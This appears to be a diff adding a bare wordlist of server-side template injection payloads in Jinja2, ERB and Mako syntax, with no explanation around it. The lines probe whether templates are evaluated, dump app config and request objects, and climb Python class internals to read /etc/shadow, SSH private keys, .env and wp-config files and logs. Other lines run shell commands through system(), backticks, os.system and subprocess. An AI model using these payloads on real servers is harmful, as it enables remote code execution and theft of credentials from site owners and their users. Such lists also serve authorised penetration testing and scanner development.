@@ -1,0 +1,299 @@
+{{ 7*7 }}
+{{ 7*7 }}
+{{ 7*7 }}
+{{ config }}
+{{ config.items() }}
+{{ config.keys() }}
+{{ config.values() }}
+{{ self }}
+{{ self.__class__ }}
+{{ self.__class__.__mro__ }}
+{{ self.__class__.__mro__[1] }}
+{{ self.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__ }}
+{{ ''.__class__.__mro__ }}
+{{ ''.__class__.__mro__[1] }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ request }}
+{{ request.application }}
+{{ request.application.__self__ }}
+{{ request.application.__self__._get_data_for_json }}
+{{ g }}
+{{ session }}
+{{ url_for }}
+{{ get_flashed_messages }}
+{{ request.args }}
+{{ request.form }}
+{{ request.cookies }}
+{{ request.headers }}
+{{ request.environ }}
+{{ request.environ.items() }}
+{{ self.__dict__ }}
+{{ self.__class__.__dict__ }}
+{{ self.__class__.__mro__ }}
+{{ self.__class__.__mro__[1].__subclasses__() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/config.php').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/wp-config.php').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/.env').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/windows/win.ini').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/config.php').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/wp-config.php').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/.env').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/proc/self/cmdline').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apache2/access.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/nginx/access.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/httpd/access_log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/root/.bash_history').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/home/user/.bash_history').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/nginx/nginx.conf').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/apache2/httpd.conf').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/mysql/my.cnf').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/7.4/apache2/php.ini').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/7.4/cli/php.ini').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/8.0/apache2/php.ini').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/8.0/cli/php.ini').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/phpmyadmin/config.inc.php').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/ssh/sshd_config').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/ssh/ssh_config').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/root/.ssh/id_rsa').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/home/user/.ssh/id_rsa').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/fstab').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/crontab').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/sudoers').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd-').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow-').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/group').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts.allow').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts.deny').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shells').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/issue').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/os-release').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/debian_version').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/redhat-release').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/centos-release').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/syslog').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/auth.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/secure').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/messages').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/dpkg.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apt/history.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apt/term.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/boot.log').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/cron').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/maillog').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/wtmp').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/utmp').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/lastlog').read() }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/faillog').read() }}
+<%= 7*7 %>
+<%= 7*7 %>
+<%= 7*7 %>
+<%= system("id") %>
+<%= system("whoami") %>
+<%= system("uname -a") %>
+<%= system("ls") %>
+<%= system("pwd") %>
+<%= system("cat /etc/passwd") %>
+<%= system("cat /etc/hosts") %>
+<%= system("cat /var/www/html/config.php") %>
+<%= system("cat /var/www/html/wp-config.php") %>
+<%= system("cat /var/www/html/.env") %>
+<%= system("cat C:/windows/win.ini") %>
+<%= system("cat C:/xampp/htdocs/config.php") %>
+<%= system("cat C:/xampp/htdocs/wp-config.php") %>
+<%= system("cat C:/xampp/htdocs/.env") %>
+<%= `id` %>
+<%= `whoami` %>
+<%= `uname -a` %>
+<%= `ls` %>
+<%= `pwd` %>
+<%= `cat /etc/passwd` %>
+<%= `cat /etc/hosts` %>
+<%= `cat /var/www/html/config.php` %>
+<%= `cat /var/www/html/wp-config.php` %>
+<%= `cat /var/www/html/.env` %>
+<%= `cat C:/windows/win.ini` %>
+<%= `cat C:/xampp/htdocs/config.php` %>
+<%= `cat C:/xampp/htdocs/wp-config.php` %>
+<%= `cat C:/xampp/htdocs/.env` %>
+${ 7*7 }
+${ 7*7 }
+${ 7*7 }
+${ __import__('os').system('id') }
+${ __import__('os').system('whoami') }
+${ __import__('os').system('uname -a') }
+${ __import__('os').system('ls') }
+${ __import__('os').system('pwd') }
+${ __import__('os').system('cat /etc/passwd') }
+${ __import__('os').system('cat /etc/hosts') }
+${ __import__('os').system('cat /var/www/html/config.php') }
+${ __import__('os').system('cat /var/www/html/wp-config.php') }
+${ __import__('os').system('cat /var/www/html/.env') }
+${ __import__('os').system('cat C:/windows/win.ini') }
+${ __import__('os').system('cat C:/xampp/htdocs/config.php') }
+${ __import__('os').system('cat C:/xampp/htdocs/wp-config.php') }
+${ __import__('os').system('cat C:/xampp/htdocs/.env') }
+${ __import__('subprocess').check_output('id', shell=True) }
+${ __import__('subprocess').check_output('whoami', shell=True) }
+${ __import__('subprocess').check_output('uname -a', shell=True) }
+${ __import__('subprocess').check_output('ls', shell=True) }
+${ __import__('subprocess').check_output('pwd', shell=True) }
+${ __import__('subprocess').check_output('cat /etc/passwd', shell=True) }
+${ __import__('subprocess').check_output('cat /etc/hosts', shell=True) }
+${ __import__('subprocess').check_output('cat /var/www/html/config.php', shell=True) }
+${ __import__('subprocess').check_output('cat /var/www/html/wp-config.php', shell=True) }
+${ __import__('subprocess').check_output('cat /var/www/html/.env', shell=True) }
+${ __import__('subprocess').check_output('cat C:/windows/win.ini', shell=True) }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/config.php', shell=True) }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/wp-config.php', shell=True) }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/.env', shell=True) }
+{{ config }} {{ 7*7 }}
+{{ config.items() }} {{ 7*7 }}
+{{ config.keys() }} {{ 7*7 }}
+{{ config.values() }} {{ 7*7 }}
+{{ self }} {{ 7*7 }}
+{{ self.__class__ }} {{ 7*7 }}
+{{ self.__class__.__mro__ }} {{ 7*7 }}
+{{ self.__class__.__mro__[1] }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__() }} {{ 7*7 }}
+{{ ''.__class__ }} {{ 7*7 }}
+{{ ''.__class__.__mro__ }} {{ 7*7 }}
+{{ ''.__class__.__mro__[1] }} {{ 7*7 }}
+{{ ''.__class__.__mro__[1].__subclasses__() }} {{ 7*7 }}
+{{ request }} {{ 7*7 }}
+{{ request.application }} {{ 7*7 }}
+{{ request.application.__self__ }} {{ 7*7 }}
+{{ request.application.__self__._get_data_for_json }} {{ 7*7 }}
+{{ g }} {{ 7*7 }}
+{{ session }} {{ 7*7 }}
+{{ url_for }} {{ 7*7 }}
+{{ get_flashed_messages }} {{ 7*7 }}
+{{ request.args }} {{ 7*7 }}
+{{ request.form }} {{ 7*7 }}
+{{ request.cookies }} {{ 7*7 }}
+{{ request.headers }} {{ 7*7 }}
+{{ request.environ }} {{ 7*7 }}
+{{ request.environ.items() }} {{ 7*7 }}
+{{ self.__dict__ }} {{ 7*7 }}
+{{ self.__class__.__dict__ }} {{ 7*7 }}
+{{ self.__class__.__mro__ }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/config.php').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/wp-config.php').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/.env').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/windows/win.ini').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/config.php').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/wp-config.php').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('C:/xampp/htdocs/.env').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/proc/self/cmdline').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apache2/access.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/nginx/access.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/httpd/access_log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/root/.bash_history').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/home/user/.bash_history').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/nginx/nginx.conf').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/apache2/httpd.conf').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/mysql/my.cnf').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/7.4/apache2/php.ini').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/7.4/cli/php.ini').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/8.0/apache2/php.ini').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/php/8.0/cli/php.ini').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/phpmyadmin/config.inc.php').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/ssh/sshd_config').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/ssh/ssh_config').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/root/.ssh/id_rsa').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/home/user/.ssh/id_rsa').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/fstab').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/crontab').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/sudoers').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd-').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow-').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/group').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts.allow').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts.deny').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/shells').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/issue').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/os-release').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/debian_version').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/redhat-release').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/etc/centos-release').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/syslog').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/auth.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/secure').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/messages').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/dpkg.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apt/history.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/apt/term.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/boot.log').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/cron').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/maillog').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/wtmp').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/utmp').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/lastlog').read() }} {{ 7*7 }}
+{{ self.__class__.__mro__[1].__subclasses__()[40]('/var/log/faillog').read() }} {{ 7*7 }}
+<%= 7*7 %> <%= 7*7 %>
+<%= system("id") %> <%= 7*7 %>
+<%= system("whoami") %> <%= 7*7 %>
+<%= system("uname -a") %> <%= 7*7 %>
+<%= system("ls") %> <%= 7*7 %>
+<%= system("pwd") %> <%= 7*7 %>
+<%= system("cat /etc/passwd") %> <%= 7*7 %>
+<%= system("cat /etc/hosts") %> <%= 7*7 %>
+<%= system("cat /var/www/html/config.php") %> <%= 7*7 %>
+<%= system("cat /var/www/html/wp-config.php") %> <%= 7*7 %>
+<%= system("cat /var/www/html/.env") %> <%= 7*7 %>
+<%= system("cat C:/windows/win.ini") %> <%= 7*7 %>
+<%= system("cat C:/xampp/htdocs/config.php") %> <%= 7*7 %>
+<%= system("cat C:/xampp/htdocs/wp-config.php") %> <%= 7*7 %>
+<%= system("cat C:/xampp/htdocs/.env") %> <%= 7*7 %>
+<%= `id` %> <%= 7*7 %>
+<%= `whoami` %> <%= 7*7 %>
+<%= `uname -a` %> <%= 7*7 %>
+<%= `ls` %> <%= 7*7 %>
+<%= `pwd` %> <%= 7*7 %>
+<%= `cat /etc/passwd` %> <%= 7*7 %>
+<%= `cat /etc/hosts` %> <%= 7*7 %>
+<%= `cat /var/www/html/config.php` %> <%= 7*7 %>
+<%= `cat /var/www/html/wp-config.php` %> <%= 7*7 %>
+<%= `cat /var/www/html/.env` %> <%= 7*7 %>
+<%= `cat C:/windows/win.ini` %> <%= 7*7 %>
+<%= `cat C:/xampp/htdocs/config.php` %> <%= 7*7 %>
+<%= `cat C:/xampp/htdocs/wp-config.php` %> <%= 7*7 %>
+<%= `cat C:/xampp/htdocs/.env` %> <%= 7*7 %>
+${ 7*7 } ${ 7*7 }
+${ __import__('os').system('id') } ${ 7*7 }
+${ __import__('os').system('whoami') } ${ 7*7 }
+${ __import__('os').system('uname -a') } ${ 7*7 }
+${ __import__('os').system('ls') } ${ 7*7 }
+${ __import__('os').system('pwd') } ${ 7*7 }
+${ __import__('os').system('cat /etc/passwd') } ${ 7*7 }
+${ __import__('os').system('cat /etc/hosts') } ${ 7*7 }
+${ __import__('os').system('cat /var/www/html/config.php') } ${ 7*7 }
+${ __import__('os').system('cat /var/www/html/wp-config.php') } ${ 7*7 }
+${ __import__('os').system('cat /var/www/html/.env') } ${ 7*7 }
+${ __import__('os').system('cat C:/windows/win.ini') } ${ 7*7 }
+${ __import__('os').system('cat C:/xampp/htdocs/config.php') } ${ 7*7 }
+${ __import__('os').system('cat C:/xampp/htdocs/wp-config.php') } ${ 7*7 }
+${ __import__('os').system('cat C:/xampp/htdocs/.env') } ${ 7*7 }
+${ __import__('subprocess').check_output('id', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('whoami', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('uname -a', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('ls', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('pwd', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat /etc/passwd', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat /etc/hosts', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat /var/www/html/config.php', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat /var/www/html/wp-config.php', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat /var/www/html/.env', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat C:/windows/win.ini', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/config.php', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/wp-config.php', shell=True) } ${ 7*7 }
+${ __import__('subprocess').check_output('cat C:/xampp/htdocs/.env', shell=True) } ${ 7*7 }
